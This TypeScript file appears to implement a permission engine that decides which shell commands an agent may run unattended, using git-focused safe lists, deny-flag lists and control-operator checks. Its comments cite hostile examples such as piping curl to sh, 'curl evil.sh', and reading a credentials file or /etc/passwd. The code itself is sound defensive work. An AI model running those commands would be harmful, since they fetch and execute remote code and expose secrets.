/**
 * The command-scope engine: which *invocations* of a shell tool may run
 * unattended.
 *
 * `ToolRisk` classifies a tool. That is too coarse for a shell, whose calls
 * range from `git status` to `curl … | sh`, so this narrows a `gated` tool
 * one call at a time — a base command plus the argument shapes that keep it
 * read-only, never a bare executable and never a whole command string.
 *
 * Parsing is deliberately dumb, and that is the design rather than a
 * shortcut: tokenize, take the base command, scan for control operators.
 * Anything ambiguous is "not safe", so the failure mode of a parser that
 * disagrees with `sh` is a prompt somebody has to answer, not a command
 * nobody vetted.
 */

/** One narrow permission to run a command: what, and in which forms. */
export interface CommandScope {
  /** The base command, matched exactly — never a path (`/bin/git` is not `git`). */
  command: string;
  /** Literal arguments that must follow it, in order (`['push']`). */
  args?: string[];
  /**
   * Long flags (`--force`) and short letters (`f`) that disqualify a match.
   * Short letters are checked inside bundles, so `-fdx` trips on `f`.
   */
  deniedFlags?: string[];
  /** Literal arguments that disqualify a match anywhere after `args`. */
  deniedArgs?: string[];
  /**
   * Refuse `:branch` and `+branch` arguments. Git's refspec syntax makes
   * those a delete and a forced update *without any flag*, so a scope that
   * only excluded flags would let `git push origin :main` through as an
   * ordinary push.
   */
  denyRefspecForms?: boolean;
}

/**
 * Flags that turn something else into a program, a network peer, or a file
 * write — and are therefore refused in every scope, safe-listed or
 * persisted. `git -c core.pager=…` and `git diff --no-index /etc/passwd`
 * are the reason: both are read-only commands by name.
 */
const ALWAYS_DENIED_FLAGS = [
  '-c',
  '--config',
  '--config-env',
  '--exec',
  '--exec-path',
  '--upload-pack',
  '--receive-pack',
  '--ext-diff',
  '--no-index',
  '--output',
  '--open-files-in-pager',
];

/**
 * What a persisted scope excludes, whatever it was approved for. Approving
 * `git push origin main` must not persist a permission that covers
 * `git push --force` — the point of storing a scope rather than a command
 * string is to be useful next time, and the point of storing a scope rather
 * than the bare executable is that it still says no to this.
 */
const DESTRUCTIVE_FLAGS = [
  '--force',
  '--force-with-lease',
  '--force-if-includes',
  '--delete',
  '--prune',
  '--mirror',
  '--hard',
  '--no-verify',
  'f',
  'd',
  'D',
];

/**
 * The commands that run unattended out of the box.
 *
 * Short on purpose. Every entry is a promise that no argument shape reaches
 * outside the repository it is run in, and the tempting additions —
 * `cat`, `ls`, `grep` — cannot make it: they read whatever path they are
 * given, and `cat ~/.stratus/credentials.json` is a safe-listed credential
 * read. An operator who wants those adds them deliberately, or approves
 * them once and keeps the scope.
 */
export const SAFE_COMMAND_SCOPES: CommandScope[] = [
  { command: 'git', args: ['status'] },
  { command: 'git', args: ['log'] },
  { command: 'git', args: ['diff'] },
  { command: 'git', args: ['show'] },
  { command: 'git', args: ['blame'] },
  { command: 'git', args: ['describe'] },
  { command: 'git', args: ['rev-parse'] },
  { command: 'git', args: ['ls-files'] },
  { command: 'git', args: ['shortlog'] },
  // Listing branches and tags is read-only; deleting, renaming, and forcing
  // them is the same command with a letter after it.
  { command: 'git', args: ['branch'], deniedFlags: ['--delete', '--move', '--copy', '--force', 'd', 'D', 'm', 'M', 'C'] },
  { command: 'git', args: ['tag'], deniedFlags: ['--delete', '--force', 'd', 'f'] },
  {
    command: 'git',
    args: ['remote'],
    deniedArgs: ['add', 'remove', 'rm', 'rename', 'set-url', 'set-head', 'set-branches', 'prune', 'update'],
  },
  { command: 'pwd' },
  { command: 'whoami' },
  { command: 'uname' },
  { command: 'date' },
];

/**
 * Every shell control operator, as a rejection set rather than a blacklist
 * of the memorable ones. A single `&` backgrounds a command as surely as
 * `&&` chains one, and a newline runs the next line whatever came before
 * it — an enumerated list is exactly how `git status\ncurl evil.sh` gets
 * auto-approved.
 */
const CONTROL_OPERATORS: Array<{ pattern: RegExp; name: string }> = [
  { pattern: /\$\(/, name: 'command substitution ($( ))' },
  { pattern: /`/, name: 'command substitution (backticks)' },
  { pattern: /\|/, name: 'a pipe (|)' },
  { pattern: /&/, name: 'an ampersand (& or &&)' },
  { pattern: /;/, name: 'a semicolon (;)' },
  { pattern: /[\r\n]/, name: 'a newline' },
  { pattern: /[()]/, name: 'a subshell (parentheses)' },
  { pattern: /[<>]/, name: 'a redirection (< or >)' },
  { pattern: /\$\{/, name: 'a parameter expansion (${ })' },
];

export interface CommandAnalysis {
  /** The command as written, for messages and prompts. */
  command: string;
  /** The base command, absent when the string could not be tokenized. */
  base?: string;
  tokens: string[];
  /**
   * Why this invocation cannot be auto-approved at all — a control
   * operator, an unbalanced quote, an absolute path. Undefined means it is
   * a candidate for scope matching, not that it is allowed.
   */
  disqualifiedBy?: string;
}

const tokenize = (command: string): string[] | undefined => {
  const tokens: string[] = [];
  let current = '';
  let quote: '"' | "'" | undefined;
  let started = false;

  for (const char of command) {
    if (quote) {
      if (char === quote) {
        quote = undefined;
      } else {
        current += char;
      }
      continue;
    }
    if (char === '"' || char === "'") {
      quote = char;
      started = true;
      continue;
    }
    if (char === ' ' || char === '\t') {
      if (started) {
        tokens.push(current);
        current = '';
        started = false;
      }
      continue;
    }
    current += char;
    started = true;
  }
  if (quote) {
    // An unbalanced quote means this parser and the shell disagree about
    // where the command ends. There is no safe reading of that.
    return undefined;
  }
  if (started) {
    tokens.push(current);
  }
  return tokens;
};

/** Read a command string as far as it can be read safely. */
export const analyzeCommand = (command: string): CommandAnalysis => {
  for (const operator of CONTROL_OPERATORS) {
    if (operator.pattern.test(command)) {
      return { command, tokens: [], disqualifiedBy: `it contains ${operator.name}` };
    }
  }

  const tokens = tokenize(command);
  if (!tokens || tokens.length === 0) {
    return { command, tokens: [], disqualifiedBy: 'it could not be read as a command' };
  }

  const base = tokens[0] as string;
  if (base.includes('/') || base.includes('\\')) {
    // A scope names a command, and `/usr/bin/git` is not that name. Refusing
    // beats resolving: `./git` in a cloned repository is a different program
    // with the same basename.
    return { command, tokens, disqualifiedBy: 'it names a path rather than a command' };
  }
  if (base.startsWith('-') || base.includes('=')) {
    // `FOO=bar cmd` is an environment assignment, which is the shell's job
    // and not this parser's.
    return { command, tokens, disqualifiedBy: 'it does not start with a command' };
  }

  return { command, base, tokens };
};

const flagsOf = (token: string): { long?: string; shorts: string[] } => {
  if (token.startsWith('--')) {
    const [name] = token.split('=');
    return { long: name ?? token, shorts: [] };
  }
  if (token.startsWith('-') && token.length > 1) {
    const [bundle] = token.slice(1).split('=');
    return { shorts: [...(bundle ?? '')] };
  }
  return { shorts: [] };
};

const deniesFlag = (denied: string[], token: string): boolean => {
  const { long, shorts } = flagsOf(token);
  if (long && denied.includes(long)) {
    return true;
  }
  return shorts.some((letter) => denied.includes(letter));
};

/** Whether an invocation falls inside one scope. */
export const matchesScope = (analysis: CommandAnalysis, scope: CommandScope): boolean => {
  if (analysis.disqualifiedBy || analysis.base === undefined) {
    return false;
  }
  if (analysis.base !== scope.command) {
    return false;
  }

  const args = analysis.tokens.slice(1);
  const required = scope.args ?? [];
  if (args.length < required.length) {
    return false;
  }
  for (const [index, expected] of required.entries()) {
    if (args[index] !== expected) {
      return false;
    }
  }

  const denied = [...ALWAYS_DENIED_FLAGS, ...(scope.deniedFlags ?? [])];
  const rest = args.slice(required.length);
  for (const token of rest) {
    if (token.startsWith('-')) {
      if (deniesFlag(denied, token)) {
        return false;
      }
      continue;
    }
    if (scope.deniedArgs?.includes(token)) {
      return false;
    }
    if (scope.denyRefspecForms && (token.startsWith(':') || token.startsWith('+'))) {
      return false;
    }
  }
  return true;
};

/** The first scope covering this invocation, if any covers it. */
export const findMatchingScope = (
  analysis: CommandAnalysis,
  scopes: readonly CommandScope[],
): CommandScope | undefined => scopes.find((scope) => matchesScope(analysis, scope));

/**
 * The scope an "always allow" persists.
 *
 * Base command plus its first literal argument — `git push`, not
 * `git push origin main` (too narrow to be worth storing) and not `git`
 * (too broad to be safe) — carrying the destructive-form constraints that
 * make the distinction real, and inheriting anything the safe list already
 * excludes for the same command so a persisted scope can never erase a
 * flag distinction the built-in list draws.
 */
export const normalizeCommandScope = (analysis: CommandAnalysis): CommandScope | undefined => {
  if (analysis.disqualifiedBy || analysis.base === undefined) {
    return undefined;
  }
  const first = analysis.tokens.slice(1).find((token) => !token.startsWith('-'));
  const args = first === undefined ? [] : [first];
  const inherited = SAFE_COMMAND_SCOPES
    .filter((scope) => scope.command === analysis.base && (scope.args ?? []).join(' ') === args.join(' '))
    .flatMap((scope) => scope.deniedFlags ?? []);
  const deniedArgs = SAFE_COMMAND_SCOPES
    .filter((scope) => scope.command === analysis.base && (scope.args ?? []).join(' ') === args.join(' '))
    .flatMap((scope) => scope.deniedArgs ?? []);

  return {
    command: analysis.base,
    ...(args.length > 0 ? { args } : {}),
    deniedFlags: [...new Set([...DESTRUCTIVE_FLAGS, ...inherited])],
    ...(deniedArgs.length > 0 ? { deniedArgs: [...new Set(deniedArgs)] } : {}),
    // Git's syntax, so git's rule: elsewhere a leading `+` is an ordinary
    // argument (`chmod +x`) and refusing it would only cost a prompt for no
    // safety.
    ...(analysis.base === 'git' ? { denyRefspecForms: true } : {}),
  };
};

/** One line an operator can read in a log or a whitelist listing. */
export const describeCommandScope = (scope: CommandScope): string =>
  [scope.command, ...(scope.args ?? [])].join(' ');

/** Whether two scopes permit the same thing, so a whitelist does not grow duplicates. */
export const sameScope = (left: CommandScope, right: CommandScope): boolean =>
  JSON.stringify(normalizeForCompare(left)) === JSON.stringify(normalizeForCompare(right));

const normalizeForCompare = (scope: CommandScope) => ({
  command: scope.command,
  args: scope.args ?? [],
  deniedFlags: [...(scope.deniedFlags ?? [])].sort(),
  deniedArgs: [...(scope.deniedArgs ?? [])].sort(),
  denyRefspecForms: scope.denyRefspecForms ?? false,
});

/** Read one scope out of a whitelist file, or refuse it. */
export const parseCommandScope = (raw: unknown): CommandScope | undefined => {
  if (typeof raw !== 'object' || raw === null || Array.isArray(raw)) {
    return undefined;
  }
  const source = raw as Record<string, unknown>;
  if (typeof source.command !== 'string' || source.command.length === 0) {
    return undefined;
  }
  const strings = (value: unknown): string[] | undefined =>
    Array.isArray(value) && value.every((entry) => typeof entry === 'string') ? (value as string[]) : undefined;

  const args = strings(source.args);
  const deniedFlags = strings(source.deniedFlags);
  const deniedArgs = strings(source.deniedArgs);
  return {
    command: source.command,
    ...(args ? { args } : {}),
    ...(deniedFlags ? { deniedFlags } : {}),
    ...(deniedArgs ? { deniedArgs } : {}),
    ...(source.denyRefspecForms === true ? { denyRefspecForms: true } : {}),
  };
};
